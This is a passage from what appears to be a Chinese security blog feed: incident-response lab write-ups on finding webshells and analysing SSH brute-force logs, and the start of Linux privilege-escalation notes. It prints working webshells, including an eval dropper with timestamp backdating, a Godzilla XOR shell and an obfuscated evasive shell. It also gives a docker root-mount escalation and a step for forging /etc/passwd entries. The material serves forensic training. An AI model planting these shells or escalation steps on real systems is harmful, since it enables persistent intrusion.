alt="image-20240709111702355"></p><p>查看开放的端口：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p 表示显示进程标识符和/或进程名称，这可以帮助你查看哪个进程正在使用网络连接。<br>-a 表示显示所有活动的 TCP 连接和监听端口。<br>-n 表示以数字形式显示地址和端口号，不进行域名解析。<br>-t 表示显示 TCP 表。<br>-u 表示显示 UDP 表。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>用该命令查找特征文件：</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#将标准输入数据转换成命令行参数，也就是将find的输入变成命令行参数传递给grep命令</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>去查一下密码为<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>看一下index.php的内容可以知道通过该文件生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>黑客留了一个木马文件，就是<strong>shell(1).elf</strong>文件</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>可以看到没有可执行权限，这里加一个权限，然后开另一个端口查看端口情况</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>最后可以看到其ip为<strong>10.11.55.21</strong>，端口为3333</p><p>最终的各个flag如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2 id="用工具的做法"><a href="#用工具的做法" class="headerlink" title="用工具的做法"></a>用工具的做法</h2><p>用D盾来进行扫描,不过D盾没有Linux版本，所以需要通过将远程的Linux文件系统挂载到Windows上面，然后用D盾扫即可。</p><p>这里参考这篇文章来布置：<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>采用的方法是<strong>winfsp + sshfs-win</strong>，这两个直接网上下载安装好即可：<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>第一种方法是右击此电脑选择映射网络驱动器：</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>或者输入sshfs.r，sshfs是挂载用户家目录，sshfs.r是挂载远程的根目录</p><p>点击完成后输入密码即可挂载</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>然后直接用D盾进行扫描web目录：</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>或者用sshfs-manage(sshfs的界面化工具，要单独再去下载)将Linux目录挂载到Windows，这里就懒得试了😥</p><p>还可以用net use命令挂载：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //列出所有网络连接<br>net use Z: /del      //删除本机映射的Z盘 <br>net use * /del /y    //删除所有映射和IPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120         //将对方根目录映射为Z盘<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //将对方根目录映射为Z盘（其他端口）<br></code></pre></td></tr></table></figure><h1 id="weshell查杀"><a href="#weshell查杀" class="headerlink" title="weshell查杀"></a>weshell查杀</h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">靶机账号密码 root xjwebshell<br>1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;<br>3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.黑客免杀马完整路径 md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>直接上D盾扫，用的还是上面的方法</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" alt="image-20240709155032413"></p><p>先看一个简单的shell文件</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>这就是一个简单的webshell</p><p>再找找其他的，在gz.php找的的webshell比较特别</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是第一个flag，flag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>然后就是看是什么类型的webshell，这里可以明显看到是哥斯拉的流量特征，是哥斯拉里面的一个异或加密脚本</p><p>哥斯拉的github地址：<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzilla，然后进行md5就是flag，flag{39392de3218c333f794befef07ac9257}</a></p><p>隐藏shell就是上面D盾查找出的.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>也是一个哥斯拉的shell，路径就为：&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php，flag为flag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>最后一个是免杀马，这里静态检测就检测不到了，但是webshell执行的话会在日志留下记录，可以去日志里面看一看，Linux的日志在**&#x2F;var&#x2F;log**目录下</p><p>不过D盾已经把他扫出来了，就是top.php，我们也可以在日志access.log中看到他的记录</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>这里进行了混淆和加密，路径md5就是flag，flag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>参考文章：<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078，里面有手工查杀的方式，总结了一些常见webshell特征</a></p><p>这里copy一些知识点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//各webshell的危险函数<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//文件操作<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//网络操作<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>手工查杀免杀可以看他有没有编码函数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1 id="linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号root密码linuxrz<br>ssh root@IP<br>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割<br>2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割<br>3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割<br>4.登陆成功的IP共爆破了多少次<br>5.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><p>首先查看有多少ip在爆破ssh的root账号那就去查看&#x2F;var&#x2F;log下的日志</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>看auth.log.1里面的登陆失败信息，这个是auth.log的归档文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>命令解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1：cat 命令用于连接文件并打印到标准输出设备，这里是用来显示 /var/log/auth.log.1 文件的内容。<br><br>grep -a &quot;Failed password for root&quot;：grep 命令用于搜索包含特定文本的行。这里搜索的是包含文本 &quot;Failed password for root&quot; 的行，表示 root 用户登录失败的事件。-a 选项是告诉 grep 以文本文件的方式处理二进制文件，保证输出的一致性。<br><br>awk &#x27;&#123;print $11&#125;&#x27;：awk 是一个强大的文本处理工具。这里 &#123;print $11&#125; 表示打印每行的第11个字段。在 auth.log 中，第11个字段通常是登录失败时尝试使用的用户名。<br><br>sort：sort 命令对输入的行进行排序。由于前面 awk 输出的是 root 用户的登录失败行，这里的 sort 将这些行进行字典序排序。<br><br>uniq -c：uniq 命令用于过滤掉排序后的重复行。-c 选项表示在每行前显示该行在文件中出现的次数。<br><br>sort -nr：再次使用 sort 命令，-n 选项表示按照数值排序，-r 选项表示降序排序。这里对 uniq 命令的输出结果按出现次数进行降序排序。<br><br>more：more 命令用于分页显示输出结果，允许用户逐步查看长输出，而不是一次性显示所有内容。<br></code></pre></td></tr></table></figure><p>可以找到3个ip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>爆破成功的用户就去查”Accepted”的字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>爆破用户命的字典就查”Failed password”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>查找登录成功登陆的ip一共爆破了多少次，就查看”Failed password for root”字段，也就是第一个的查询，前面的数字就是登陆次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>后门用户就查”new user”字段</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>也可以直接看&#x2F;etc&#x2F;passwd的内容</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>后门用户是test2</p><p><strong>来补充一下日志相关的知识</strong></p><p>参考这篇文章：<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>上面查询的字段是日志的级别信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user 表示尝试使用了一个不存在的用户登录系统。<br>Failed password 表示为某个用户输入了错误的密码。<br>authentication failure 表示认证失败。<br>Connection closed 表示连接被关闭。<br>Accepted password 表示密码认证成功。<br>new user 或 new group 表示创建了新用户或新用户组。<br>password changed 表示用户密码被更改。<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux入侵排查&quot;&gt;&lt;a href=&quot;#Linux入侵排查&quot; class=&quot;headerlink&quot; title=&quot;Linux入侵排查&quot;&gt;&lt;/a&gt;Linux入侵排查&lt;/h1&gt;&lt;p&gt;这是靶机的简介&lt;/p&gt;
&lt;figure class=&quot;highlight plain</summary>
      
    
    
    
    <category term="应急响应wp" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权-不安全配置项</title>
    <link href="https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
    <id>https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</id>
    <published>2024-07-01T05:26:22.000Z</published>
    <updated>2024-08-05T15:42:00.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="不安全的用户组"><a href="#不安全的用户组" class="headerlink" title="不安全的用户组"></a>不安全的用户组</h1><p><strong>disk用户组</strong></p><p>disk用户组是Linux中一个特殊的用户组，组内成员可以对一些块设备(比如硬盘、CD等)进行读写。如果属于disk用户组，就可以打开Linux的内置工具debugfs的交互式命令行，并可以挂载到文件系统来调试文件</p><p>先df命令查看文件系统磁盘信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>假设当前的目录分区为&#x2F;dev&#x2F;sda2，然后debugfs打开交互式命令行</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>这时就可以对文件系统进行调试</p><p><strong>adm用户组</strong></p><p>此组的成员通常拥有读取和写入系统日志文件、查看系统性能指标以及执行其他系统管理任务的权限。可以查看&#x2F;var&#x2F;log下的目录系统敏感日志</p><p><strong>shadow用户组</strong></p><p>&#x2F;etc&#x2F;shadow用于存储用户密码，除了root用户，还有shadow用户组成员也可以查看该文件。</p><p><strong>lxd用户组</strong></p><p>改组成员可以使用Linux容器(LXD)。</p><p>Linux容器是一种轻量级的虚拟化技术，能够在单个Linux系统上运行多个独立的Linux实例。</p><p>用户所属该组时，可以使用lxc命令创建新容器，然后将宿主机的文件系统挂载至容器中，即可查看宿主机的敏感文件等操作</p><p><strong>Docker用户组</strong></p><p>Linux安装完docker之后会创建一个名为docker的用户组。如果属于这个组或者是root用户就可以使用docker命令尝试提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#该命令用于将宿主机的根目录挂载到容器的/mnt目录下</span><br><span class="hljs-comment"># 执行这条命令时，docker检查是否存在alpine镜像，不存在会从docker hub中下载，然后以该镜像作为基础</span><br></code></pre></td></tr></table></figure><p>然后就可以在容器中访问宿主机的系统文件了</p><h1 id="不安全的读写权限"><a href="#不安全的读写权限" class="headerlink" title="不安全的读写权限"></a>不安全的读写权限</h1><p><strong>可写的&#x2F;etc&#x2F;passwd文件</strong></p><p>查看&#x2F;etc&#x2F;passwd的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh /etc/passwd<br></code></pre></td></tr></table></figure><p>如果存在任意用户可以读写的情况，就可以生成用户信息添加到该文件中</p><p>执行下面命令生成带盐密码</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;123456&quot;,&quot;suiyi&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>可读的&#x2F;etc&#x2F;shadow文件</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;不安全的用户组&quot;&gt;&lt;a href=&quot;#不安全的用户组&quot; class=&quot;headerlink&quot; title=&quot;不安全的用户组&quot;&gt;&lt;/a&gt;不安全的用户组&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;disk用户组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;disk用户组是Linux中一个特殊</summary>
      
    
    
    
    <category term="Linux提权" scheme="https://clowsman.github.io/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linux提权" scheme="https://clowsman.github.io/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权-信息搜集</title>
    <link href="https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://clowsman.github.io/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2024-06-25T11:30:08.000Z</published>
    <updated>2024-07-15T07:11:59.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务器信息枚举"><a href="#服务器信息枚举" class="headerlink" title="服务器信息枚举"></a>服务器信息枚举</h1><p><strong>判断是否虚拟化</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">systemd-detect-virt <span class="hljs-comment">#识别系统运行环境，看是否虚拟化</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511101.png" alt="image-20240625200028837"></p><p><strong>查找当前shell是否处于docker中</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><p><strong>查看系统信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a <span class="hljs-comment">#可以看到操作系统名称、版本、架构、主机名、内核版本信息等</span><br></code></pre></td></tr></table></figure><p><strong>查看内核版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure><p><strong>查看系统架构信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><p><strong>查看发行版本信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><strong>查看系统主机名信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hostname<br><span class="hljs-built_in">uname</span> -n<br></code></pre></td></tr></table></figure><h1 id="用户信息枚举"><a href="#用户信息枚举" class="headerlink" title="用户信息枚举"></a>用户信息枚举</h1><p><strong>查看当前用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户详细信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> <span class="hljs-comment">#包含用户名、用户ID和用户所属组及组ID</span><br></code></pre></td></tr></table></figure><p><strong>查看所有用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>查看系统中所有用户组</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/group<br></code></pre></td></tr></table></figure><p><strong>查看id和对应组信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f1 /etc/passwd 2&gt;/dev/null);<span class="hljs-keyword">do</span> <span class="hljs-built_in">id</span> <span 